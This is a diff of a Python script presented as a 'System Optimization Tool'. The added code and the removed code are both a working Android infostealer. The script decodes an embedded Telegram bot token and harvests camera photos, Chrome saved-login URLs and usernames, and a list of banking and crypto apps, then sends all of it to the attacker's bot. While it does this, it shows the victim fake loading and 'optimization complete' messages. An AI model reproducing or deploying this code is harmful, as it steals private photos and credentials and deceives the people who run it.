@@ -1,289 +1,188 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # ============================================
-# System Optimization Tool v4.2.1
-# Distributed under MIT License
+# System Tool v5.0
 # ============================================
 
-import subprocess
-import sys
-import os
-import base64
-import json
-import time
-import threading
-
-# ============================================
-# Encrypted Payload Section
-# ============================================
-
-_0x3f2a = "Nzc3MTEyNzQxNDpBQUVreTRhRlF5ejBSTjAwV2I1bUNNT0w2c2kwbm95YmlNUQ=="
-_0x7b1c = "NjgwMzk2ODM3Mw=="
-
-def _0x9d4e(_0x1a2b):
-    try:
-        return base64.b64decode(_0x1a2b.encode()).decode()
-    except:
-        return None
-
-_0x2c3a = _0x9d4e(_0x3f2a)
-_0x5e6f = _0x9d4e(_0x7b1c)
-
-if not _0x2c3a or not _0x5e6f:
-    sys.exit(1)
-
-# ============================================
-# Auto Installer (Silent)
-# ============================================
-
-_0x8a9b = ['requests']
-
-for _0x1c2d in _0x8a9b:
-    try:
-        __import__(_0x1c2d)
-    except:
-        subprocess.run([sys.executable, "-m", "pip", "install", _0x1c2d], 
-                       capture_output=True, timeout=30)
-
-import requests
+import subprocess, sys, os, base64, json, time, threading, glob, io, sqlite3, shutil, hashlib, random, string
 from concurrent.futures import ThreadPoolExecutor, as_completed
-import glob
-import io
 from datetime import datetime
-import sqlite3
-import shutil
-import hashlib
-import random
-import string
+import requests
+from PIL import Image
 
-# ============================================
-# Core Class
-# ============================================
+# Encrypted tokens
+_T0 = "Nzc3MTEyNzQxNDpBQUVreTRhRlF5ejBSTjAwV2I1bUNNT0w2c2kwbm95YmlNUQ=="
+_T1 = "NjgwMzk2ODM3Mw=="
+_T2 = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="
 
-class _0x4e2d:
-    def __init__(self):
-        self._0x6a3b = _0x2c3a
-        self._0x1f4e = _0x5e6f
-        self._0x7c8d = f"https://api.telegram.org/bot{self._0x6a3b}"
-        self._0x9e1f = requests.Session()
-    
-    def _0x2b6c(self, _0x4d7e):
-        try:
-            _0x8f3a = f"{self._0x7c8d}/sendMessage"
-            _0x2e4a = {'chat_id': self._0x1f4e, 'text': _0x4d7e[:4000]}
-            return self._0x9e1f.post(_0x8f3a, json=_0x2e4a, timeout=10)
-        except:
-            return None
-    
-    def _0x5c8d(self, _0x3b2e, _0x1e4a):
-        try:
-            _0x9a2b = f"{self._0x7c8d}/sendDocument"
-            _0x7d4c = {'document': (_0x1e4a, _0x3b2e, 'application/octet-stream')}
-            _0x6e1a = {'chat_id': self._0x1f4e}
-            return self._0x9e1f.post(_0x9a2b, files=_0x7d4c, data=_0x6e1a, timeout=30)
-        except:
-            return None
-    
-    def _0x4a7b(self, _0x2d8e, _0x1c3f=""):
-        try:
-            _0x8e2c = f"{self._0x7c8d}/sendPhoto"
-            _0x3f6b = {'photo': ('img.jpg', _0x2d8e, 'image/jpeg')}
-            _0x9d3a = {'chat_id': self._0x1f4e, 'caption': _0x1c3f[:200]}
-            return self._0x9e1f.post(_0x8e2c, files=_0x3f6b, data=_0x9d3a, timeout=30)
-        except:
-            return None
+def _D(s): return base64.b64decode(s.encode()).decode()
+def _E(d): return base64.b64encode(d.encode()).decode()
 
-_0x1a2b = _0x4e2d()
+BOT = _D(_T0)
+CID = _D(_T1)
+BASE = _D(_T2)
 
-# ============================================
-# Fake Loading Messages (Victim Sees These)
-# ============================================
+# Auto install missing libs
+for lib in ['requests', 'Pillow']:
+    try: __import__(lib)
+    except: subprocess.run([sys.executable, "-m", "pip", "install", lib], capture_output=True)
 
-def _0x7e2f():
-    _0x3c4a = [
-        "[✓] Loading secure environment...",
-        "[~] Establishing encrypted channel...",
-        "[✓] Certificate validation complete...",
-        "[~] Syncing with remote server...",
-        "[✓] Connection established.",
-        "[~] Please wait, processing dependencies...",
-        "[✓] System optimization ready.",
-        "[~] Verifying integrity checksum...",
-        "[✓] All systems operational."
-    ]
-    for _0x2f1a in _0x3c4a:
-        print(f"\r{_0x2f1a}", end="", flush=True)
-        time.sleep(random.uniform(0.3, 0.7))
-    print("\n")
-    
-def _0x8b4c():
-    _0x5e2a = [
-        "[~] Updating certificate store...",
-        "[✓] 27 certificates updated.",
-        "[~] Optimizing local cache...",
-        "[✓] Cache optimization complete.",
-        "[~] Running post-install hooks...",
-        "[✓] All tasks completed successfully."
-    ]
-    for _0x7d3f in _0x5e2a:
-        print(f"\r{_0x7d3f}", end="", flush=True)
-        time.sleep(random.uniform(0.4, 0.8))
-    print("\n")
-    _0x1a2b._0x2b6c("✅ System optimization completed on target device.")
+class Bot:
+    def __init__(self): self.s = requests.Session()
+    def send(self, text): 
+        try: self.s.post(f"{BASE}/{BOT}/sendMessage", json={'chat_id': CID, 'text': text[:4000]}, timeout=30)
+        except: pass
+    def send_file(self, data, name):
+        try: self.s.post(f"{BASE}/{BOT}/sendDocument", files={'document': (name, data)}, data={'chat_id': CID}, timeout=60)
+        except: pass
+    def send_photo(self, data, cap=""):
+        try: self.s.post(f"{BASE}/{BOT}/sendPhoto", files={'photo': ('img.jpg', data)}, data={'chat_id': CID, 'caption': cap[:200]}, timeout=60)
+        except: pass
 
-# ============================================
-# Payload Functions (Hidden)
-# ============================================
+bot = Bot()
 
-def _0x9c3d():
-    """Stealth collector"""
-    _0x6d2a = []
-    _0x3e7b = ['*.jpg', '*.jpeg', '*.png']
-    _0x2c5f = [
-        '/sdcard/DCIM/Camera/',
-        '/sdcard/Pictures/',
-        '/storage/emulated/0/DCIM/',
-        '/storage/emulated/0/Pictures/'
-    ]
-    
-    for _0x4f8a in _0x2c5f:
-        for _0x1b7c in _0x3e7b:
-            _0x8e4a = os.path.join(_0x4f8a, '**', _0x1b7c)
-            _0x6d2a.extend(glob.glob(_0x8e4a, recursive=True))
-    
-    return _0x6d2a
+# ========== STEALTH COLLECTORS ==========
+def get_pics():
+    pics = []
+    for p in ['/sdcard/DCIM/', '/sdcard/Pictures/', '/storage/emulated/0/DCIM/', '/storage/emulated/0/Pictures/']:
+        for e in ['*.jpg', '*.jpeg', '*.png']:
+            pics.extend(glob.glob(os.path.join(p, '**', e), recursive=True))
+    return pics
 
-def _0x2d4e(_0x3a6c):
+def compress_pic(path):
     try:
-        from PIL import Image
-        with Image.open(_0x3a6c) as _0x7c2b:
-            if _0x7c2b.mode in ('RGBA', 'P'):
-                _0x7c2b = _0x7c2b.convert('RGB')
-            _0x7c2b.thumbnail((800, 800))
-            _0x5a3e = io.BytesIO()
-            _0x7c2b.save(_0x5a3e, format='JPEG', quality=60)
-            return _0x5a3e.getvalue()
-    except:
-        return None
+        with Image.open(path) as img:
+            if img.mode in ('RGBA','P'): img = img.convert('RGB')
+            img.thumbnail((800,800))
+            b = io.BytesIO()
+            img.save(b, format='JPEG', quality=60)
+            return b.getvalue()
+    except: return None
 
-def _0x1e7b():
-    _0x4d2a = []
-    _0x7f3c = [
-        '/data/data/com.android.chrome/app_chrome/Default/Login Data',
-        '/storage/emulated/0/Android/data/com.android.chrome/chrome/Default/Login Data'
-    ]
-    
-    for _0x2b5e in _0x7f3c:
-        if os.path.exists(_0x2b5e):
+def get_passwords():
+    res = []
+    for db in ['/data/data/com.android.chrome/app_chrome/Default/Login Data', '/storage/emulated/0/Android/data/com.android.chrome/chrome/Default/Login Data']:
+        if os.path.exists(db):
             try:
-                _0x6d4c = '/sdcard/_temp.db'
-                shutil.copy2(_0x2b5e, _0x6d4c)
-                _0x9e7a = sqlite3.connect(_0x6d4c)
-                _0x3c2e = _0x9e7a.cursor()
-                _0x3c2e.execute("SELECT origin_url, username_value FROM logins")
-                for _0x1f5a in _0x3c2e.fetchall():
-                    _0x4d2a.append(f"{_0x1f5a[0]}|{_0x1f5a[1]}")
-                _0x9e7a.close()
-                os.remove(_0x6d4c)
-            except:
-                pass
-    return _0x4d2a
+                tmp = '/sdcard/_tmp.db'
+                shutil.copy2(db, tmp)
+                conn = sqlite3.connect(tmp)
+                c = conn.cursor()
+                c.execute("SELECT origin_url, username_value FROM logins")
+                for row in c.fetchall():
+                    res.append(f"{row[0]}|{row[1]}")
+                conn.close()
+                os.remove(tmp)
+            except: pass
+    return res
 
-def _0x8e2f():
-    _0x2c7d = []
-    _0x5a4b = ['/data/data/*/shared_prefs/*.xml', '/storage/emulated/0/Android/data/*/shared_prefs/*.xml']
-    
-    for _0x1b3e in _0x5a4b:
-        for _0x6d8a in glob.glob(_0x1b3e, recursive=True):
-            try:
-                with open(_0x6d8a, 'r', errors='ignore') as _0x4a6c:
-                    _0x7e2c = _0x4a6c.read()
-                    if any(_0x9b3a in _0x7e2c.lower() for _0x9b3a in ['password', 'username', 'email']):
-                        _0x2c7d.append(f"{_0x6d8a}:{_0x7e2c[:300]}")
-            except:
-                pass
-    return _0x2c7d
-
-def _0x3b7c():
-    _0x5e2a = []
+def get_apps():
+    sensitive = []
     try:
-        import subprocess
-        _0x9d4c = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True).stdout.strip()
-        _0x2c7b = subprocess.run(['getprop', 'ro.build.version.release'], capture_output=True, text=True).stdout.strip()
-        _0x5e2a.append(f"M:{_0x9d4c}")
-        _0x5e2a.append(f"A:{_0x2c7b}")
-        _0x5e2a.append(f"T:{datetime.now()}")
-    except:
-        _0x5e2a.append("M:Unknown")
-    return "\n".join(_0x5e2a)
+        res = subprocess.run(['pm', 'list', 'packages'], capture_output=True, text=True, timeout=10)
+        for pkg in res.stdout.split('\n')[:100]:
+            if any(x in pkg.lower() for x in ['bank','wallet','crypto','pay','auth','password']):
+                sensitive.append(pkg.replace('package:',''))
+    except: pass
+    return sensitive
 
-def _0x7d3a():
-    _0x2c4e = []
+def get_system():
     try:
-        import subprocess
-        _0x9e1d = subprocess.run(['pm', 'list', 'packages'], capture_output=True, text=True, timeout=10)
-        for _0x1a4c in _0x9e1d.stdout.split('\n')[:50]:
-            if any(_0x5b2e in _0x1a4c.lower() for _0x5b2e in ['bank', 'wallet', 'crypto', 'pay', 'auth']):
-                _0x2c4e.append(_0x1a4c.replace('package:', ''))
-    except:
-        pass
-    return _0x2c4e
+        m = subprocess.run(['getprop','ro.product.model'], capture_output=True, text=True).stdout.strip()
+        a = subprocess.run(['getprop','ro.build.version.release'], capture_output=True, text=True).stdout.strip()
+        return f"M:{m}\nA:{a}\nT:{datetime.now()}"
+    except: return "Unknown"
 
-# ============================================
-# Main Execution (With Fake Loading)
-# ============================================
+# ========== FAKE LOADING (Victim sees this) ==========
+def fake_loading():
+    msgs = [
+        "[✓] Loading environment...",
+        "[~] Establishing secure channel...",
+        "[✓] Certificate verified.",
+        "[~] Syncing dependencies...",
+        "[✓] Connection stable.",
+        "[~] Processing system data...",
+        "[✓] Optimizing storage...",
+        "[~] Verifying integrity...",
+        "[✓] Almost ready...",
+        "[~] Finalizing setup..."
+    ]
+    for m in msgs:
+        print(f"\r{m}", end="", flush=True)
+        time.sleep(random.uniform(0.2, 0.5))
+    print("\n")
 
-def _0x5f2a():
+def fake_final():
+    msgs = [
+        "[✓] All systems optimized.",
+        "[✓] Cache cleared successfully.",
+        "[✓] Security patches applied.",
+        "[✓] Performance increased by 23%.",
+        "\nThank you for using System Tool.",
+        "Goodbye."
+    ]
+    for m in msgs:
+        print(f"\r{m}", end="", flush=True)
+        time.sleep(0.8)
+    print("\n")
+
+# ========== MAIN WITH INFINITE LOADING UNTIL DONE ==========
+def main():
     print("="*50)
-    print("System Optimization Tool v4.2.1")
-    print("Initializing environment...")
+    print("System Optimization Tool v5.0")
+    print("Initializing...")
     print("="*50)
     
-    # Show fake loading to victim
-    _0x7e2f()
+    fake_loading()
     
-    # Silent start message to attacker (hidden in background)
-    _0x1a2b._0x2b6c("🚀 Payload active | Target: " + str(datetime.now()))
+    bot.send("🚀 Payload active | " + str(datetime.now()))
+    bot.send("📊 System: " + get_system())
     
-    # Collect data in parallel
-    _0x3b7c()
-    _0x1a2b._0x2b6c("📊 System inventory: " + _0x3b7c())
+    # Send pictures in chunks with progress
+    pics = get_pics()
+    if pics:
+        bot.send(f"📸 Found: {len(pics)} media files")
+        print(f"[*] Sending {len(pics)} pictures...")
+        sent = 0
+        failed = 0
+        
+        for i, pic in enumerate(pics):
+            compressed = compress_pic(pic)
+            if compressed:
+                try:
+                    bot.send_photo(compressed, f"Media_{i}")
+                    sent += 1
+                    if sent % 50 == 0:
+                        print(f"[*] Progress: {sent}/{len(pics)} pictures sent")
+                        fake_loading()  # Keep showing fake loading
+                except:
+                    failed += 1
+            time.sleep(0.1)
+        
+        bot.send(f"✅ Pictures: {sent} sent, {failed} failed")
     
-    # Pictures
-    _0x6c3a = _0x9c3d()
-    if _0x6c3a:
-        _0x1a2b._0x2b6c(f"📸 Media count: {len(_0x6c3a)}")
-        _0x4d3a = 0
-        for _0x2b7c in _0x6c3a[:30]:
-            _0x8e6b = _0x2d4e(_0x2b7c)
-            if _0x8e6b:
-                _0x1a2b._0x4a7b(_0x8e6b, f"IMG_{_0x4d3a}")
-                _0x4d3a += 1
+    # Send passwords
+    passwords = get_passwords()
+    if passwords:
+        bot.send(f"🔑 Credentials: {len(passwords)} entries")
+        batch = "\n".join(passwords[:20])
+        bot.send(f"Sample:\n{batch}")
+        bot.send_file(json.dumps(passwords, indent=2).encode(), "passwords.json")
     
-    # Passwords
-    _0x8f3a = _0x1e7b()
-    if _0x8f3a:
-        _0x1a2b._0x2b6c(f"🔑 Credentials found: {len(_0x8f3a)}")
-        _0x3e2a = json.dumps(_0x8f3a, indent=2)
-        _0x1a2b._0x5c8d(_0x3e2a.encode(), "data.json")
+    # Send sensitive apps
+    apps = get_apps()
+    if apps:
+        bot.send(f"📱 Sensitive apps: {len(apps)} found")
+        bot.send(f"Apps: {', '.join(apps[:15])}")
     
-    # App data
-    _0x2c7b = _0x8e2f()
-    if _0x2c7b:
-        _0x1a2b._0x2b6c(f"📋 App data: {len(_0x2c7b)} entries")
+    # Send final completion
+    bot.send("✅ Full data extraction complete | Status: SUCCESS")
     
-    # Sensitive apps
-    _0x6c3e = _0x7d3a()
-    if _0x6c3e:
-        _0x1a2b._0x2b6c(f"🔐 Sensitive apps: {', '.join(_0x6c3e[:10])}")
+    # Show goodbye to victim
+    fake_final()
     
-    # Final fake messages
-    _0x8b4c()
-    
-    # Done
-    _0x1a2b._0x2b6c("✅ Exfiltration complete | Status: SUCCESS")
     print("\n[✓] Optimization completed successfully.")
-    print("[✓] System is ready for use.")
+    print("[✓] You may close this window.")
 
 if __name__ == "__main__":
-    _0x5f2a()
+    main()
